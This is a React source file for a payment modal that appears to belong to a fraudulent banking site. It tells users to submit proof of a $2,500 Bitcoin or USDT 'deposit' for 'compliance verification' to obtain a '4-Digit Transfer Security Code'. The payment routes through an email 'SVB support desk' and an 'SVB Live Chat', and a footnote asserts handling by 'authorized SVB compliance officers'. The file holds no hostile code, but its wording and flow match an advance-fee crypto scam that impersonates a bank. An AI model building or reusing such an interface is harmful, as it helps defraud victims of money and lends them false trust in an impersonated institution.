import React from 'react';
import { Mail, MessageSquare, ExternalLink, X, ShieldCheck, ArrowRight, Clock, AlertCircle } from 'lucide-react';
import { User } from '../types';
import { openLiveAgentEmail, SUPPORT_EMAIL } from '../utils/supportEmail';

interface PaymentProofOptionsModalProps {
  isOpen: boolean;
  onClose: () => void;
  user: User;
  cryptoMethod: 'BTC' | 'USDT';
  walletAddress?: string;
  onSelectSVBLive: () => void;
  onSelectLiveAgent: () => void;
  submitting?: boolean;
}

export const PaymentProofOptionsModal: React.FC<PaymentProofOptionsModalProps> = ({
  isOpen,
  onClose,
  user,
  cryptoMethod,
  walletAddress,
  onSelectSVBLive,
  onSelectLiveAgent,
  submitting = false
}) => {
  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-[60] bg-slate-950/85 backdrop-blur-md flex items-center justify-center p-4 animate-fadeIn">
      <div className="bg-slate-900 border border-slate-700/80 rounded-3xl p-6 sm:p-7 max-w-lg w-full space-y-6 shadow-2xl relative text-left">
        {/* Close Button */}
        <button
          onClick={onClose}
          disabled={submitting}
          className="absolute top-4 right-4 text-slate-400 hover:text-white p-2 rounded-xl bg-slate-800 hover:bg-slate-700 transition-colors cursor-pointer disabled:opacity-50"
        >
          <X className="w-5 h-5" />
        </button>

        {/* Header */}
        <div className="flex items-start gap-4">
          <div className="w-12 h-12 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 shrink-0">
            <ShieldCheck className="w-6 h-6" />
          </div>
          <div>
            <h3 className="text-lg font-bold text-white tracking-tight">
              Payment Proof Support Options
            </h3>
            <p className="text-xs text-slate-400 mt-1">
              Select how you would like to submit your <span className="font-semibold text-amber-400">$2,500.00 {cryptoMethod}</span> payment proof for compliance verification.
            </p>
          </div>
        </div>

        {/* Info summary card */}
        <div className="bg-slate-950 p-3.5 rounded-2xl border border-slate-800 text-xs text-slate-300 flex items-center justify-between">
          <div>
            <span className="text-slate-500 text-[11px] block">Verification Target:</span>
            <span className="font-semibold text-slate-200">4-Digit Transfer Security Code</span>
          </div>
          <div className="text-right">
            <span className="text-slate-500 text-[11px] block">Deposit Amount:</span>
            <span className="font-bold text-amber-400">$2,500.00 USD</span>
          </div>
        </div>

        {/* Options Grid */}
        <div className="space-y-3.5">
          {/* Option 1: Submit to Live Agent */}
          <div
            onClick={() => !submitting && onSelectLiveAgent()}
            className="group relative bg-slate-950 hover:bg-slate-800/80 border border-slate-800 hover:border-emerald-500/50 rounded-2xl p-4 sm:p-5 transition-all cursor-pointer shadow-lg hover:shadow-emerald-500/10"
          >
            <div className="flex items-start justify-between gap-3">
              <div className="flex items-start gap-3.5">
                <div className="w-10 h-10 rounded-xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 shrink-0 group-hover:scale-105 transition-transform">
                  <Mail className="w-5 h-5" />
                </div>
                <div className="space-y-1">
                  <div className="flex items-center gap-2">
                    <h4 className="text-sm font-bold text-white group-hover:text-emerald-400 transition-colors">
                      1. Submit to Live Agent
                    </h4>
                    <span className="bg-emerald-500/20 text-emerald-300 text-[10px] font-bold px-2 py-0.5 rounded-full border border-emerald-500/30">
                      External Email
                    </span>
                  </div>
                  <p className="text-xs text-slate-400 leading-relaxed">
                    Open your email application (Gmail, Apple Mail, Outlook) with the official SVB support desk pre-filled to submit proof from your personal email.
                  </p>
                </div>
              </div>
              <div className="text-slate-500 group-hover:text-emerald-400 transition-colors shrink-0 pt-1">
                <ExternalLink className="w-4 h-4" />
              </div>
            </div>
            
            <div className="mt-3 pt-3 border-t border-slate-800/80 flex items-center justify-between text-[11px] text-slate-400">
              <span className="text-emerald-400/90 font-mono text-[10px]">{SUPPORT_EMAIL}</span>
              <span className="font-semibold text-emerald-400 flex items-center gap-1 group-hover:translate-x-0.5 transition-transform">
                Open Email App <ArrowRight className="w-3 h-3" />
              </span>
            </div>
          </div>

          {/* Option 2: Submit to SVB Live */}
          <div
            onClick={() => !submitting && onSelectSVBLive()}
            className="group relative bg-slate-950 hover:bg-slate-800/80 border border-slate-800 hover:border-cyan-500/50 rounded-2xl p-4 sm:p-5 transition-all cursor-pointer shadow-lg hover:shadow-cyan-500/10"
          >
            <div className="flex items-start justify-between gap-3">
              <div className="flex items-start gap-3.5">
                <div className="w-10 h-10 rounded-xl bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-center text-cyan-400 shrink-0 group-hover:scale-105 transition-transform">
                  <MessageSquare className="w-5 h-5" />
                </div>
                <div className="space-y-1">
                  <div className="flex items-center gap-2">
                    <h4 className="text-sm font-bold text-white group-hover:text-cyan-400 transition-colors">
                      2. Submit to SVB Live
                    </h4>
                    <span className="bg-cyan-500/20 text-cyan-300 text-[10px] font-bold px-2 py-0.5 rounded-full border border-cyan-500/30">
                      Website Live Chat
                    </span>
                  </div>
                  <p className="text-xs text-slate-400 leading-relaxed">
                    Submit your proof directly through the website's built-in SVB Live Chat to initiate direct support desk communication.
                  </p>
                </div>
              </div>
              <div className="text-slate-500 group-hover:text-cyan-400 transition-colors shrink-0 pt-1">
                <ArrowRight className="w-4 h-4" />
              </div>
            </div>

            <div className="mt-3 pt-3 border-t border-slate-800/80 flex items-center justify-between text-[11px] text-slate-400">
              <span className="text-cyan-400/90 font-medium text-[10px]">Instant Online Chat Session</span>
              <span className="font-semibold text-cyan-400 flex items-center gap-1 group-hover:translate-x-0.5 transition-transform">
                Launch Live Chat <ArrowRight className="w-3 h-3" />
              </span>
            </div>
          </div>
        </div>

        {/* Security / Privacy Footnote */}
        <div className="text-[11px] text-slate-500 text-center flex items-center justify-center gap-1.5 pt-1">
          <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
          <span>All submissions are securely encrypted and handled exclusively by authorized SVB compliance officers.</span>
        </div>
      </div>
    </div>
  );
};
